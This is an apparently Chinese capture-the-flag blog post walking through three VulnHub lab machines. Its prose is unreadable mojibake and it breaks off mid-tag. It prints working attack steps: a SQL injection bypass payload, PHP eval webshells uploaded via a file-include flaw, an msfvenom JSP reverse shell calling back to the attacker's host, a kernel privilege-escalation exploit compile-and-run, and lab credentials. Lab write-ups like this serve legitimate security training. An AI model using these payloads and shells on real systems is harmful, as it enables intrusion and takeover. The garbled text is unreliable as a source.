        <content type="html"><![CDATA[<p>å¼€å§‹å­¦ç‚¹æ›´æœ‰æ„æ€çš„ï¼Œä» VlunHub å¼€å§‹åˆ·åˆ·å§ã€‚</p><p>æ‰€æœ‰é¶åœºç¯å¢ƒæ¥æºï¼š<a href="https://www.vulnhub.com/">https://www.vulnhub.com/</a></p><h2 id="Me-and-My-Girlfriend-1"><a href="#Me-and-My-Girlfriend-1" class="headerlink" title="Me and My Girlfriend: 1"></a>Me and My Girlfriend: 1</h2><p>è®°å½•ä¸€ä¸‹è¸©åˆ°çš„å‘å§ï¼Œä¸€å¼€å§‹ä¸€ç›´æ‰¾ä¸åˆ° IP åœ°å€ï¼Œåæ¥å°è¯•åœ¨è‡ªå·±çš„å¦å¤–ä¸€å°è™šæ‹Ÿæœºé‡Œé¢ ifconfig çœ‹çœ‹ç½‘æ®µï¼Œå†ç”¨ Nmap æ‰¾äº†ä¸€ä¸‹ã€‚ï¼ˆè¦ç”¨ NAT æ¨¡å¼ï¼Œæ”¹å®Œä¹‹åè¦é‡å¯ï¼‰</p><p><img src="https://i.loli.net/2021/05/10/QfTMzclrhmnC6Od.png"></p><p>å¯ä»¥å‘ç°è¿™ä¸¤ä¸ª IPï¼Œä¸Šé¢çš„æ˜¯ğŸ‘´çš„è™šæ‹Ÿæœºçš„ IPï¼Œé‚£ä¹ˆä¸‹é¢é‚£ä¸ªå°±æ˜¯é¶æœºçš„ IP äº†ï¼Œè€Œä¸”å¯ä»¥å‘ç°åªæœ‰å®ƒå¼€å¯äº† http ä¸ ssh æœåŠ¡ï¼š</p><p><img src="https://i.loli.net/2021/05/10/SAcCMQ5KPG6L9hT.png"></p><p>è¿›å…¥é¡µé¢ï¼Œé¡µé¢å›æ˜¾ï¼š<code>Who are you? Hacker? Sorry This Site Can Only Be Accessed local!</code></p><p>XFF æ”¹ä¸€ä¸‹ 127.0.0.1 è¿›å…¥ã€‚å‘ç°å­˜åœ¨ login ä¸ registerï¼Œå…ˆéšä¾¿æ³¨å†Œä¸€ä¸ªè´¦å·ï¼Œå‘ç° id ä» 12 å¼€å§‹ï¼š</p><p><img src="https://i.loli.net/2021/05/10/KXcNlg4eZusi8zU.png"></p><p>å°è¯•ä¿®æ”¹ idï¼Œå‘ç°å­˜åœ¨è¶Šæƒæ¼æ´ï¼šï¼ˆå¯ä»¥æ¨æµ‹åå°ä»£ç ä¸ºï¼š<code>selct * from user where id = intval($_GET[&#39;id&#39;]);</code></p><p><img src="https://i.loli.net/2021/05/10/vM635ZVh1cafJHU.png" alt="SL~LFWIE20__5MHIR6O4U_7.png"></p><p>å¯ä»¥çˆ†ç ´ä¸€ä¸‹å‰ 11 ä¸ª id å¾—åˆ°ç”¨æˆ·åå’Œå¯†ç è¡¨ï¼š</p><p><img src="https://i.loli.net/2021/05/10/oBW3p8i759FjUTX.png"></p><table><thead><tr><th>id</th><th>ç”¨æˆ·å</th><th>å¯†ç </th></tr></thead><tbody><tr><td>1</td><td>eweuhtandingan</td><td>skuyatuh</td></tr><tr><td>2</td><td>aingmaung</td><td>qwerty!!!</td></tr><tr><td>3</td><td>sundatea</td><td>indONEsia</td></tr><tr><td>4</td><td>sedihaingmah</td><td>cedihhihihi</td></tr><tr><td>5</td><td>alice</td><td>4lic3</td></tr><tr><td>9</td><td>abdikasepak</td><td>dorrrrr</td></tr><tr><td>12</td><td>Du1</td><td>Du1</td></tr></tbody></table><p>ssh è¿æ¥ï¼Œæ¯ä¸ªè´¦å·éƒ½è¯•ä¸€éï¼Œæœ€åå‘ç° alice æˆåŠŸç™»ä¸Šï¼šï¼ˆå…¶å®åœ¨é¢˜ç›®æè¿°é‡Œé¢ä¹Ÿæåˆ°äº† Aliceï¼Œä¹Ÿç®—æ˜¯ä¸€ä¸ªæš—ç¤ºå§ï¼‰</p><p><img src="https://i.loli.net/2021/05/10/LTVUujl9rsOqKHm.png"></p><p>å…ˆåˆ°å¤„çœ‹çœ‹ï¼Œè·å–åˆ° flag1ï¼Œç»§ç»­å¾€ä¸‹çœ‹ã€‚</p><p><img src="https://i.loli.net/2021/05/10/toaRemSF38Whsqk.png"></p><p>å‘ç° <code>/var/www/html/config/config.php</code> ä¸­çš„è¿™ä¸€å¥ï¼š<code>$conn = mysqli_connect(&#39;localhost&#39;, &#39;root&#39;, &#39;ctf_pasti_bisa&#39;, &#39;ceban_corp&#39;)</code>ã€‚å¥½å®¶ä¼™ï¼Œæ•°æ®åº“æ˜¯ root ç”¨æˆ·ï¼Œç›´æ¥ <code>su root</code> ç™»ä¸€æ³¢ï¼Œå‘ç° flag2</p><p><img src="https://i.loli.net/2021/05/11/JCRpyBb3YlXrcuz.png"></p><h2 id="Billu-b0x"><a href="#Billu-b0x" class="headerlink" title="Billu_b0x"></a>Billu_b0x</h2><p>Nmap æ‰«æä¸€ä¸‹ç«¯å£åŠæœåŠ¡ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">22&#x2F;tcp open  ssh     OpenSSH 5.9p1 Debian 5ubuntu1.4 (Ubuntu Linux; protocol 2.0)</span><br><span class="line">80&#x2F;tcp open  http    Apache httpd 2.2.22 ((Ubuntu))</span><br></pre></td></tr></table></figure><p>è®¿é—®ä¸€ä¸‹ http æœåŠ¡ï¼Œå‘ç°æ˜¯ä¸€ä¸ªç™»é™†é¡µé¢ï¼Œæç¤ºè¯´ â€œShow me your SQLI skillsâ€ï¼Œåº”è¯¥æ˜¯è¦ sql æ³¨å…¥ã€‚</p><p>æ‰«ä¸€ä¸‹ï¼Œå¾—åˆ°ä¸€äº›é¡µé¢ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">[07:43:17] 200 -  307B  - &#x2F;add</span><br><span class="line">[07:43:19] 200 -    1B  - &#x2F;c</span><br><span class="line">[07:43:21] 200 -    1KB - &#x2F;images&#x2F;</span><br><span class="line">[07:43:21] 200 -    3KB - &#x2F;index</span><br><span class="line">[07:43:21] 200 -    3KB - &#x2F;index.php</span><br><span class="line">[07:43:21] 200 -   47KB - &#x2F;in</span><br><span class="line">[07:43:22] 302 -    2KB - &#x2F;panel  -&gt;  index.php</span><br><span class="line">[07:43:22] 302 -    2KB - &#x2F;panel.php  -&gt;  index.php</span><br><span class="line">[07:43:23] 200 -    8KB - &#x2F;phpmy&#x2F;</span><br><span class="line">[07:43:23] 200 -    1B  - &#x2F;show</span><br><span class="line">[07:43:24] 200 -   72B  - &#x2F;test</span><br><span class="line">[07:43:24] 200 -   72B  - &#x2F;test.php</span><br></pre></td></tr></table></figure><p>åœ¨ test.php å‘ç°ä»»æ„æ–‡ä»¶ä¸‹è½½ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;POST http:&#x2F;&#x2F;192.168.237.134&#x2F;test.php</span><br><span class="line">file&#x3D;&#x2F;etc&#x2F;passwd</span><br></pre></td></tr></table></figure><p>å¯ä»¥æŠŠæ‰€æœ‰é¡µé¢çš„æºç ä¸‹è½½ä¸‹æ¥ï¼š</p><ul><li>add.php æ˜¯ä¸€ä¸ªæ— æ³•ä½¿ç”¨åŠŸèƒ½çš„ä¸Šä¼ é¡µé¢</li><li>in.php é‡Œæ˜¯ phpinfoï¼Œæ²¡æœ‰æœ‰ç”¨ä¿¡æ¯</li><li>c.php æ˜¯æ•°æ®åº“è¿æ¥æ–‡ä»¶ï¼Œå‘ç° <code>$conn = mysqli_connect(&quot;127.0.0.1&quot;,&quot;billu&quot;,&quot;b0x_billu&quot;,&quot;ica_lab&quot;);</code>ï¼Œä»è€ŒçŸ¥é“æ•°æ®åº“è¿æ¥çš„ç”¨æˆ·åå¯†ç </li><li>/etc/passwd ä¸­æœ‰ä¸€ä¸ª id ä¸º 1000 çš„ç”¨æˆ·ï¼Œåä¸º ica</li></ul><p>è®¿é—® phpmyï¼Œç”¨æˆ‘ä»¬è·å¾—çš„æ•°æ®åº“å¯†ç å»ç™»å½•è®¿é—®ã€‚</p><p><img src="https://i.loli.net/2021/05/11/GljBuzU34ZPCo9I.png"></p><p>è·å–åˆ° index.php ä¸­ç™»é™†çš„ç”¨æˆ·åä¸å¯†ç ã€‚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">biLLu</span><br><span class="line">hEx_it</span><br></pre></td></tr></table></figure><p>è¿›å…¥ã€‚</p><p><img src="https://i.loli.net/2021/05/11/Ty48Kgz7LcniF3P.png"></p><p>panel.php ä¸­å­˜åœ¨ä»»æ„æ–‡ä»¶åŒ…å«ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;continue&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$choice</span>===<span class="string">&#x27;add&#x27;</span>) &#123;&#125;</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$choice</span>===<span class="string">&#x27;show&#x27;</span>) &#123;&#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">include</span>(<span class="variable">$dir</span>.<span class="string">&#x27;/&#x27;</span>.<span class="variable">$_POST</span>[<span class="string">&#x27;load&#x27;</span>]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å†çœ‹ä¸€ä¸‹ upload çš„ä¸Šä¼ é€»è¾‘å§ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$r</span>=pathinfo(<span class="variable">$_FILES</span>[<span class="string">&#x27;image&#x27;</span>][<span class="string">&#x27;name&#x27;</span>],PATHINFO_EXTENSION);</span><br><span class="line"><span class="variable">$image</span>=<span class="keyword">array</span>(<span class="string">&#x27;jpeg&#x27;</span>,<span class="string">&#x27;jpg&#x27;</span>,<span class="string">&#x27;gif&#x27;</span>,<span class="string">&#x27;png&#x27;</span>);</span><br><span class="line"><span class="keyword">if</span> (in_array(<span class="variable">$r</span>,<span class="variable">$image</span>)) &#123;&#125;</span><br></pre></td></tr></table></figure><p>é‚£å°±ç›´æ¥å†™ä¸ª <code>&lt;?php @eval($_POST[&quot;Du1&quot;]);phpinfo(); ?&gt;</code> çš„ğŸï¼Œåç¼€æ”¹ä¸‹ pngï¼Œä¼ ä¸Šå»åŒ…å«ä¸€ä¸‹å°± ok äº†ï¼š</p><p><img src="https://i.loli.net/2021/05/11/omna17ShKRxqwpQ.png"></p><p>åå¼¹ä¸€ä¸‹ shellï¼Œç„¶åæ€ä¹ˆéƒ½åå¼¹ä¸å›ï¼Œå¾ˆçƒ¦ï¼Œæ‰€ä»¥ç›´æ¥å†™ä¸ªğŸåˆ° upload_images é‡Œé¢ï¼š<code>echo%20&#39;&lt;?php%20eval($_POST[&quot;Du1&quot;]);?&gt;&#39;%20&gt;%20uploaded_images/1.php</code>ï¼Œèšå‰‘è¿ä¸Šï¼šï¼ˆuploaded_images æœ‰å†™æƒé™ï¼‰</p><p><img src="https://i.loli.net/2021/05/11/oPXG5jDAetKrfgC.png"></p><p><code>uname -a</code> ä¸ <code>cat /etc/issue</code> æŸ¥çœ‹å†…æ ¸åŠç³»ç»Ÿç‰ˆæœ¬ï¼Œå¯»æ‰¾ææƒ expï¼š<a href="https://www.exploit-db.com/exploits/37292/">https://www.exploit-db.com/exploits/37292/</a></p><p>ç„¶åä¼ ä¸Šå»ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">chmod 777 exp.c  # èµ‹äºˆæƒé™</span><br><span class="line">gcc exp.c -o exp  # ç¼–è¯‘</span><br><span class="line">./exp  # æ‰§è¡Œï¼Œææƒè‡³ root</span><br></pre></td></tr></table></figure><p>ç™»å½•é‚£é‡Œå…¶å®è¿˜æœ‰å¦ä¸€ç§è§£æ³•ï¼šä¹‹å‰æåˆ°è¿‡ sql æ³¨å…¥ï¼Œæˆ‘ä»¬å¯ä»¥å®¡è®¡ä¸€ä¸‹ index.php æºç ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$uname</span>=str_replace(<span class="string">&#x27;\&#x27;&#x27;</span>,<span class="string">&#x27;&#x27;</span>,urldecode(<span class="variable">$_POST</span>[<span class="string">&#x27;un&#x27;</span>]));</span><br><span class="line"><span class="variable">$pass</span>=str_replace(<span class="string">&#x27;\&#x27;&#x27;</span>,<span class="string">&#x27;&#x27;</span>,urldecode(<span class="variable">$_POST</span>[<span class="string">&#x27;ps&#x27;</span>]));</span><br><span class="line"><span class="variable">$run</span>=<span class="string">&#x27;select * from auth where  pass=\&#x27;&#x27;</span>.<span class="variable">$pass</span>.<span class="string">&#x27;\&#x27; and uname=\&#x27;&#x27;</span>.<span class="variable">$uname</span>.<span class="string">&#x27;\&#x27;&#x27;</span>;</span><br></pre></td></tr></table></figure><p>å¾ˆç®€å•çš„è¿‡æ»¤ï¼ŒæŠŠå•å¼•å·å»æ‰ï¼Œæˆ‘ä»¬ç”¨ <code>\</code> é€ƒé€¸æ‰å°± ok äº†ï¼š<code>ps=\&amp;un=or 1=1 #</code>ã€‚</p><p>å¯¹äº root çš„è¯ï¼Œè¿˜æœ‰ä¸€ä¸ªç‚¹ï¼Œå°±æ˜¯ phpmyadmin çš„é…ç½®æ–‡ä»¶è¯»å–ï¼š<code>/var/www/phpmy/config.inc.php</code>ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$cfg</span>[<span class="string">&#x27;Servers&#x27;</span>][<span class="variable">$i</span>][<span class="string">&#x27;user&#x27;</span>] = <span class="string">&#x27;root&#x27;</span>;</span><br><span class="line"><span class="variable">$cfg</span>[<span class="string">&#x27;Servers&#x27;</span>][<span class="variable">$i</span>][<span class="string">&#x27;password&#x27;</span>] = <span class="string">&#x27;roottoor&#x27;</span>;</span><br></pre></td></tr></table></figure><p>ç›´æ¥æ‹¿åˆ° root å¯†ç ã€‚</p><hr><p>æ³¨ï¼š</p><ul><li>ææƒæ–¹æ³•å¯ä»¥å¤šå…³æ³¨ä¸»è¦çš„é…ç½®æ–‡ä»¶ã€æ•°æ®åº“è¿æ¥æ–‡ä»¶ã€ç”¨æˆ·çš„æ–‡ä»¶ï¼Œä¹Ÿå¯ä»¥åˆ©ç”¨Ubuntuå·²çŸ¥æ¼æ´æœ¬åœ°ææƒ</li><li>MySQL æœ‰å¯èƒ½è¢«é«˜çº¿ç¨‹ç›®å½•æš´ç ´å’Œæ³¨å…¥å®•æœº</li></ul><h2 id="Breach1-0"><a href="#Breach1-0" class="headerlink" title="Breach1.0"></a>Breach1.0</h2><p>æ³¨ï¼š</p><p>VM è™šæœºé…ç½®æœ‰é™æ€IPåœ°å€ï¼ˆ192.168.110.140ï¼‰ï¼Œéœ€è¦å°†è™šæ‹Ÿæœºç½‘å¡è®¾ç½®ä¸º host-only æ–¹å¼ç»„ç½‘ã€‚</p><p>å…·ä½“æ–¹æ³•ï¼šç‚¹å¼€ç½‘ç»œé€‚é…å™¨ï¼Œé…ç½® vm net1 -&gt; å±æ€§ -&gt; TCP/IPV4 -&gt; ipï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">192.168.110.1</span><br><span class="line">255.255.255.0</span><br><span class="line">192.168.110.254</span><br></pre></td></tr></table></figure><hr><p>Nmap æ‰«ä¸€ä¸‹å‘ç°å®ƒæŠŠæ‰€æœ‰ç«¯å£éƒ½å¼€æ”¾äº†ï¼ˆå¯ä»¥ç”¨ -sF ç»•è¿‡é˜²æ¢æµ‹ç­–ç•¥ï¼‰â€¦â€¦æˆ‘ä»¬ç›´æ¥è®¿é—® httpã€‚åœ¨ <a href="http://192.168.110.140/impresscms/user.php">http://192.168.110.140/impresscms/user.php</a> å¯ä»¥ç™»å½• cmsã€‚</p><p><img src="https://i.loli.net/2021/05/11/mdCOWsfSDtXPM7F.png"></p><p>åœ¨ index æ³¨é‡Šä¸­æ‰¾åˆ°ä¸€æ®µ Base64ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Y0dkcFltSnZibk02WkdGdGJtbDBabVZsYkNSbmIyOWtkRzlpWldGbllXNW5KSFJo</span><br><span class="line">cGdpYmJvbnM6ZGFtbml0ZmVlbCRnb29kdG9iZWFnYW5nJHRh</span><br><span class="line">pgibbons:damnitfeel$goodtobeagang$ta</span><br></pre></td></tr></table></figure><p>è·å¾—ç”¨æˆ·åä¸å¯†ç ï¼Œç™»å½•ã€‚</p><p>Inbox ä¸­æœ‰ä¸‰å°é‚®ä»¶ï¼Œåœ¨ç¬¬ä¸‰å°é‚®ä»¶ä¸­å‘ç° <a href="http://192.168.110.140/.keystore">http://192.168.110.140/.keystore</a> å­˜åœ¨ä¸€ä¸ª SSL certificateã€‚View Account ä¸­çš„ Content æœ‰ä¸€ä¸ª SSL implementation test captureï¼Œå‘ç°æµé‡åŒ… <a href="http://192.168.110.140/impresscms/_SSL_test_phase1.pcap%EF%BC%8C%E5%90%8C%E6%97%B6%E8%8E%B7%E5%8F%96%E5%88%B0%E6%8F%90%E7%A4%BA%EF%BC%9A%60They">http://192.168.110.140/impresscms/_SSL_test_phase1.pcapï¼ŒåŒæ—¶è·å–åˆ°æç¤ºï¼š`They</a> told me the alias, storepassword and keypassword are all set to â€˜tomcatâ€™.`ï¼Œæç¤ºäº†åˆ«åã€å­˜å‚¨å¯†ç å’Œå¯†é’¥å¯†ç éƒ½è®¾ç½®ä¸º tomcatã€‚</p><p>åˆ©ç”¨ JDK çš„ keytool.exe è§£å¯†ï¼Œé¦–å…ˆæŸ¥çœ‹ keystore ä¸­çš„æ‰€æœ‰è¯ä¹¦ï¼š</p><p><code> keytool -list -keystore ./keystore</code>ï¼šï¼ˆå¯†é’¥åº“å£ä»¤ tomcatï¼‰</p><p><img src="https://i.loli.net/2021/05/11/GXZI1fwaWP4piFN.png"></p><p>ä»å¯†é’¥åº“ä¸­å¯¼å‡º .p12 è¯ä¹¦ï¼Œå°† keystore æ‹·è´åˆ° keytool ç›®å½•ï¼Œå¯¼å‡ºåä¸º tomcatkeystore.p12 çš„è¯ä¹¦ï¼š</p><p><code>keytool -importkeystore -srckeystore ./keystore -destkeystore tomcatkeystore.p12 -deststoretype PKCS12 -srcalias tomcat</code></p><p><img src="https://i.loli.net/2021/05/11/jTKaLHUbJDmrRh3.png"></p><p>ç„¶åå°† .p12 è¯ä¹¦å¯¼å…¥æ‰“å¼€äº†æµé‡åŒ…çš„ WireSharkï¼šç¼–è¾‘ -&gt; é¦–é€‰é¡¹ -&gt; Protocols -&gt; TLS -&gt; EDITï¼ˆæœ€æ–°ç‰ˆ WireShark å·²ç»æŠŠ SSLæ”¹ä¸º TLSï¼Œå…¶å® SSL/TLS éƒ½å·²ç»Ÿç§°é€šä¿¡åŠ å¯†åè®®ï¼Œæ‰€ä»¥å°±æ”¾ä¸€å—äº†ï¼‰</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">192.168.110.140 8443 http ç‚¹å‡»é€‰æ‹©è¯ä¹¦æ–‡ä»¶ è¾“å…¥å¯†ç tomcat</span><br></pre></td></tr></table></figure><p>å› ä¸º <em>8443 æ˜¯ tomcat æ‰“å¼€ SSL çš„æ–‡æœ¬æœåŠ¡çš„é»˜è®¤ç«¯å£</em></p><p>è‡³æ­¤æˆåŠŸè§£å¯†æµé‡ï¼Œåˆ†æå¯ä»¥å‘ç°å…¶ä¸­å­˜åœ¨ jsp æœ¨é©¬çš„æµé‡ï¼Œä»¥åŠé‡‡ç”¨ http basic è®¤è¯ç™»å½•åå°çš„æµé‡ï¼Œç»è¿‡ Base64 è§£å¯†åå¾—åˆ° tomcat ç”¨æˆ·ååŠå¯†ç </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tomcat:Tt\5D8F(#!*u&#x3D;G)4m7zB</span><br></pre></td></tr></table></figure><p>è®¿é—® <a href="https://192.168.110.140:8443/_M@nag3Me/html%EF%BC%8C%E5%A6%82%E6%9E%9C%E7%99%BB%E5%BD%95%E4%B8%8D%E6%88%90%E5%8A%9F%E5%8F%AF%E4%BB%A5%E5%B0%9D%E8%AF%95">https://192.168.110.140:8443/_M@nag3Me/htmlï¼Œå¦‚æœç™»å½•ä¸æˆåŠŸå¯ä»¥å°è¯•</a> BP å‘åŒ…ï¼ˆå› ä¸ºæœ€æ–°ç‰ˆæµè§ˆå™¨å¦‚æœæ²¡æœ‰ç›¸åº”è¯ä¹¦ä¼šæœ‰é™åˆ¶ï¼Œä½†æ˜¯ BP ä¸­æœ‰å„ç§è¯ä¹¦ï¼ŒæŒ‚ä¸ª BP ä»£ç†å°±ä¸Šäº†ï¼‰</p><p><img src="https://i.loli.net/2021/05/11/CszhpEtxGVRDdNH.png"></p><p>å¯ä»¥ä¸Šä¼ åŒ…å« jsp é©¬çš„ war åŒ…ï¼Œåˆ©ç”¨ msf ç›´æ¥ç”Ÿæˆï¼š<code>msfvenom -p java/jsp_shell_reverse_tcp LHOST=192.168.110.100 LPORT=2333 -f war &gt; shell.war</code>ï¼Œåœ¨ msf ä¸Šè®¾ç½®ä¸€ä¸ªç›‘å¬ï¼Œç„¶åç›´æ¥ä¼ é©¬è®¿é—®ï¼šï¼ˆå¼¹å›æ¥çš„ shell è¦ç­‰å·¨ JB ä¹…ï¼ŒğŸ‘´æ˜¯è¦æ”¾å¼ƒçš„æ—¶å€™çªç„¶å‘ç°ï¼Œæ¬¸ï¼Œæ€ä¹ˆ connect äº†ï¼‰</p><p><img src="https://i.loli.net/2021/05/13/rltALPbhEco47BK.png"></p><p><img src="https://i.loli.net/2021/05/13/dZcur9L3xApOGPj.jpg" alt="~_G_QMR9_8RRP1MXL_V@N_3.jpg"></p><p>æ­¤æ—¶æ‹¿åˆ°äº† shell äº†ï¼Œå¯ä»¥ç”¨ python æ¥è·å–äº¤äº’å¼ shellï¼š<code>python -c &#39;import pty;pty.spawn(&quot;/bin/bash&quot;)&#39; </code></p><p><img src="https://i.loli.net/2021/05/13/LDtSI2FRCoq4XEH.png"></p><p>æŸ¥çœ‹ä¸€ä¸‹ç³»ç»Ÿç”¨æˆ·ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">root:x:0:0:root:&#x2F;root:&#x2F;bin&#x2F;bash</span><br><span class="line">daemon:x:1:1:daemon:&#x2F;usr&#x2F;sbin:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">bin:x:2:2:bin:&#x2F;bin:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">sys:x:3:3:sys:&#x2F;dev:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">sync:x:4:65534:sync:&#x2F;bin:&#x2F;bin&#x2F;sync</span><br><span class="line">games:x:5:60:games:&#x2F;usr&#x2F;games:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">man:x:6:12:man:&#x2F;var&#x2F;cache&#x2F;man:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">lp:x:7:7:lp:&#x2F;var&#x2F;spool&#x2F;lpd:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">mail:x:8:8:mail:&#x2F;var&#x2F;mail:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">news:x:9:9:news:&#x2F;var&#x2F;spool&#x2F;news:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">uucp:x:10:10:uucp:&#x2F;var&#x2F;spool&#x2F;uucp:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">proxy:x:13:13:proxy:&#x2F;bin:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">www-data:x:33:33:www-data:&#x2F;var&#x2F;www:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">backup:x:34:34:backup:&#x2F;var&#x2F;backups:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">list:x:38:38:Mailing List Manager:&#x2F;var&#x2F;list:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">irc:x:39:39:ircd:&#x2F;var&#x2F;run&#x2F;ircd:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">gnats:x:41:41:Gnats Bug-Reporting System (admin):&#x2F;var&#x2F;lib&#x2F;gnats:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">nobody:x:65534:65534:nobody:&#x2F;nonexistent:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">libuuid:x:100:101::&#x2F;var&#x2F;lib&#x2F;libuuid:</span><br><span class="line">syslog:x:101:104::&#x2F;home&#x2F;syslog:&#x2F;bin&#x2F;false</span><br><span class="line">messagebus:x:102:106::&#x2F;var&#x2F;run&#x2F;dbus:&#x2F;bin&#x2F;false</span><br><span class="line">landscape:x:103:109::&#x2F;var&#x2F;lib&#x2F;landscape:&#x2F;bin&#x2F;false</span><br><span class="line">milton:x:1000:1000:Milton_Waddams,,,:&#x2F;home&#x2F;milton:&#x2F;bin&#x2F;bash</span><br><span class="line">tomcat6:x:104:112::&#x2F;usr&#x2F;share&#x2F;tomcat6:&#x2F;bin&#x2F;false</span><br><span class="line">colord:x:105:114:colord colour management daemon,,,:&#x2F;var&#x2F;lib&#x2F;colord:&#x2F;bin&#x2F;false</span><br><span class="line">mysql:x:106:116:MySQL Server,,,:&#x2F;nonexistent:&#x2F;bin&#x2F;false</span><br><span class="line">blumbergh:x:1001:1001:Bill Lumbergh,,,:&#x2F;home&#x2F;blumbergh:&#x2F;bin&#x2F;bash</span><br></pre></td></tr></table></figure><p>æœ‰ä¸¤ä¸ªç”¨æˆ·å¾ˆæœ‰æ„æ€ï¼šmilton &amp; blumberghï¼ˆå®ƒä¿©éƒ½æœ‰ /bin/bashï¼‰ã€‚å¯ä»¥åœ¨ /var/www/5446 ä¸­å‘ç°ä¸¤ä¸ªæœ‰è¶£çš„ php æ–‡ä»¶ï¼š</p><p><img src="https://i.loli.net/2021/05/13/QHYwarZ3W9FDOJm.png"></p><p>æˆ‘ä»¬æŸ¥çœ‹ä¸€ä¸‹ï¼Œé‡Œé¢æœ‰æ•°æ®åº“ç”¨æˆ· root çš„ä¿¡æ¯ï¼š</p><p><img src="https://i.loli.net/2021/05/13/rCIt6ZE58MqimnY.png"></p><p>å¯†ç ä¸ºç©ºï¼Œæˆ‘ä»¬ç›´æ¥ç”¨ mysql -uroot -p å°±å¯ä»¥ç™»å…¥ï¼š</p><p><img src="https://i.loli.net/2021/05/13/bZHUfsgpeAzFi47.png"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">show databases;</span><br><span class="line">use mysql;</span><br><span class="line">select user,password from user;</span><br></pre></td></tr></table></figure><p>å¾—åˆ°ç”¨æˆ·å¯†ç è¡¨ï¼š</p><table><thead><tr><th>user</th><th>password</th></tr></thead><tbody><tr><td>root</td><td></td></tr><tr><td>milton</td><td>6450d89bd3aff1d893b85d3ad65d2ec2</td></tr><tr><td>root</td><td></td></tr><tr><td>root</td><td></td></tr><tr><td>debian-sys-maint</td><td>*A9523939F1B2F3E72A4306C34F225ACF09590878</td></tr></tbody></table><p>å¾—åˆ° milton çš„å¯†ç  hash ä¸º 6450d89bd3aff1d893b85d3ad65d2ec2ï¼Œç»è§£å¯†å¾—åˆ°ï¼š<code>thelaststraw</code>ï¼Œå½³äºâ€¦ <code>su milton</code>ï¼Œå†è¾“å…¥å¯†ç ï¼Œè¿™æ ·å°±ææƒåˆ° milton äº†ã€‚åœ¨å†å²å‘½ä»¤ä¸­å‘ç°æœ‰ su åˆ° blumbergh ç”¨æˆ·ï¼Œå¯»æ‰¾ blumbergh ç”¨æˆ·å¯†ç ã€‚</p><p>åœ¨ <a 